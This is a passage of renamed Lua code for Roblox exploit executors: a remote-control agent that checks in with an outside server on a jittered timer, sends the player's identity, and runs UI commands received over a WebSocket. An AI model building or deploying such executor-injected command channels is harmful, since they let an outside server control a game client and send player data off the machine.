			local tbl27 = { count = 0 }
			local v14, v15 = fn38(arg.tree, v12, 1, tbl27)
			return { created = fn26(v14), objectCount = tbl27.count, propertyResult = v15 }
		end,
		["ui.update"] = function(arg)
			local v12, v13 = fn36(arg.path)

			if not v12 then
				error(v13)
			end

			return { instance = fn26(v12), result = fn33(v12, arg.props) }
		end,
		["ui.delete"] = function(arg)
			local v12 = fn14(arg.path)
			local v13, v14 = fn36(v12)

			if not v13 then
				if v12 == "" then
					return { deleted = false, reason = "managed UI does not exist" }
				end
				error(v14)
			end

			fn16(tbl15)
			local v15 = fn20(v13)
			v13:Destroy()
			return { deleted = true, path = v15 }
		end,
		["ui.list"] = function(arg)
			local v12, v13 = fn35(false)
			if not v12 then
				return { exists = false, reason = v13 or "managed UI does not exist" }
			end
			local n7 = math.floor(fn15(arg.maxDepth, 1, 10, 6))
			return { exists = true, tree = fn39(v12, 0, n7) }
		end,
		["ui.notify"] = function(arg)
			local v12, v13 = fn35(true)

			if not v12 then
				error(v13)
			end

			local notifications = v12:FindFirstChild("Notifications")

			if not notifications then
				notifications = Instance.new("Frame")
				notifications.Name = "Notifications"
				notifications.AnchorPoint = Vector2.new(1, 0)
				notifications.Position = UDim2.new(1, -16, 0, 16)
				notifications.Size = UDim2.fromOffset(360, 500)
				notifications.BackgroundTransparency = 1
				notifications.Parent = v12
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.Padding = UDim.new(0, 8)
				uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.Parent = notifications
			end

			local textLabel = Instance.new("TextLabel")
			textLabel.Name = "Notification_" .. HttpService2:GenerateGUID(false)
			textLabel.Size = UDim2.fromOffset(340, 64)
			textLabel.BackgroundColor3 = fn28(arg.color) or Color3.fromRGB(25, 35, 52)
			textLabel.BackgroundTransparency = 0.08
			textLabel.Text = tostring(arg.text):sub(1, 500)
			textLabel.TextColor3 = Color3.fromRGB(240, 247, 255)
			textLabel.TextSize = 16
			textLabel.Font = Enum.Font.GothamSemibold
			textLabel.TextWrapped = true
			textLabel.Parent = notifications
			local uiCorner = Instance.new("UICorner")
			uiCorner.CornerRadius = UDim.new(0, 10)
			uiCorner.Parent = textLabel
			local v14 = fn15(arg.duration, 0.5, 30, 4)

			task.delay(v14, function()
				if textLabel.Parent then
					textLabel:Destroy()
				end
			end)

			return { shown = true, name = textLabel.Name, duration = v14 }
		end,
	}

	local function fn48(arg)
		local str5 = tostring(arg.requestId or "")
		local unknownOrDisallowedMethod = tostring(arg.method or "")
		local v12 = tbl27[unknownOrDisallowedMethod]
		if str5 == "" then
			return
		end

		if not v12 then
			fn22({
				type = "rpc_result",
				requestId = str5,
				success = false,
				error = "Unknown or disallowed method: " .. unknownOrDisallowedMethod,
			})

			return
		end

		task.spawn(function()
			local ok, result = xpcall(function()
				return v12(type(arg.params) == "table" and arg.params or {})
			end, function(arg2)
				return debug.traceback(tostring(arg2), 2)
			end)

			if ok then
				fn22({ type = "rpc_result", requestId = str5, success = true, data = fn21(result) })
			else
				fn22({ type = "rpc_result", requestId = str5, success = false, error = tostring(result):sub(1, 2000) })
			end
		end)
	end

	local function fn49(arg)
		local ok, result = pcall(function()
			return HttpService2:JSONDecode(tostring(arg))
		end)

		if not ok or type(result) ~= "table" then
			fn13("Invalid JSON message")
			return
		end

		if result.type == "identify_ok" then
			fn12("Connected to bridge. Client ID:", tostring(result.clientId))
			local tbl28 = {}

			for k in pairs(tbl27) do
				table.insert(tbl28, k)
			end

			table.sort(tbl28)
			fn23("agent.ready", { clientId = result.clientId, methods = tbl28, playerCount = #Players2:GetPlayers() })
			return
		end

		if result.type == "pong" then
			fn12("PONG", tostring(result.seq or ""))
			return
		end

		if result.type == "rpc_request" then
			fn48(result)
			return
		end

		if result.type == "identify_error" then
			fn13("Bridge rejected identity:", tostring(result.error))
		end
	end

	local function fn50()
		flag6 = false
		fn16(tbl14)
		if not v11 then
			return
		end

		pcall(function()
			if type(v11.Close) == "function" then
				v11:Close()
			elseif type(v11.close) == "function" then
				v11:close()
			end
		end)

		v11 = nil
	end

	local function fn51()
		local v12, v13 = fn17()
		if not v12 then
			fn13("No supported WebSocket API found")
			return false
		end
		n3 += 1
		local v14 = n3
		fn12("Connecting to", str2, "using", v13)

		local ok, result = pcall(function()
			return v12(str2)
		end)

		if not ok or not result then
			fn13("Connection failed:", tostring(result))
			return false
		end
		v11 = result
		flag6 = true
		local onMessage = fn18(v11, "OnMessage", "MessageReceived")
		local onClose = fn18(v11, "OnClose", "Closed", "OnDisconnect")
		local onError = fn18(v11, "OnError", "Error")

		local v15 = fn19(onMessage, function(arg)
			if v14 == n3 then
				fn49(arg)
			end
		end)

		if v15 then
			table.insert(tbl14, v15)

			local v16 = fn19(onClose, function(...)
				if v14 == n3 then
					flag6 = false
					fn13("Socket closed", ...)
				end
			end)

			if v16 then
				table.insert(tbl14, v16)
			end

			local v17 = fn19(onError, function(...)
				if v14 == n3 then
					fn13("Socket error", ...)
					flag6 = false
				end
			end)

			if v17 then
				table.insert(tbl14, v17)
			end

			local v18, v19 = fn22({
				type = "identify",
				clientType = "roblox",
				token = str,
				name = localPlayer2.Name,
				displayName = localPlayer2.DisplayName,
				userId = localPlayer2.UserId,
				placeId = game.PlaceId,
				jobId = game.JobId,
				version = str4,
			})

			if not v18 then
				fn13(v19)
				flag6 = false
			end

			task.spawn(function()
				while flag5 and flag6 and v14 == n3 do
					task.wait(20)

					if flag5 and flag6 and v14 == n3 then
						n4 += 1
						local v20, v21 = fn22({ type = "ping", seq = n4 })

						if not v20 then
							fn13("Heartbeat failed:", tostring(v21))
							flag6 = false
						end
					end
				end
			end)

			while flag5 and flag6 and v14 == n3 do
				task.wait(0.5)
			end

			if v14 == n3 then
				fn50()
			end

			return true
		end

		fn13("Socket has no supported message event")
		fn50()
		return false
	end

	table.insert(tbl13, Players2.PlayerAdded:Connect(function(player)
		if flag4 then
			fn23("player.added", fn47(player, true))
		end
	end))

	table.insert(tbl13, Players2.PlayerRemoving:Connect(function(player)
		if flag4 then
			fn23("player.removing", fn47(player, true))
		end
	end))

	genv.StopChilliLink = function()
		if not flag5 then
			return
		end
		fn12("Stopping agent")
		flag5 = false
		n3 += 1
		fn16(tbl13)
		fn16(tbl15)
		fn50()
	end

	local request_2 = syn and syn.request or http_request or request or request_ and request_.request or fluxus and fluxus.request

	local function fn52()
		if type(request_2) ~= "function" then
			return nil
		end

		local ok, result = pcall(function()
			return HttpService2:JSONEncode({
				token = str,
				userId = localPlayer2.UserId,
				name = localPlayer2.Name,
				displayName = localPlayer2.DisplayName,
				placeId = game.PlaceId,
				jobId = game.JobId,
				version = str4,
			})
		end)

		if not ok then
			return nil
		end
		local ok2, result2 = pcall(request_2, { Url = str3, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = result })
		if not ok2 or type(result2) ~= "table" or tonumber(result2.StatusCode) ~= 200 then
			return nil
		end

		local ok3, result3 = pcall(function()
			return HttpService2:JSONDecode(tostring(result2.Body))
		end)

		if ok3 and type(result3) == "table" then
			return result3
		end
		return nil
	end

	task.spawn(function()
		while flag5 do
			local v12 = fn52()
			local n7 = 60

			if v12 then
				n7 = fn15(v12.interval, 5, 600, 60)

				if v12.connect == true and not flag7 and not flag6 then
					flag7 = true

					task.spawn(function()
						pcall(fn51)
						flag7 = false
					end)
				end
			end

			task.wait(n7 * (0.85 + math.random() * 0.3))
		end

		fn12("Agent stopped")
	end)
end
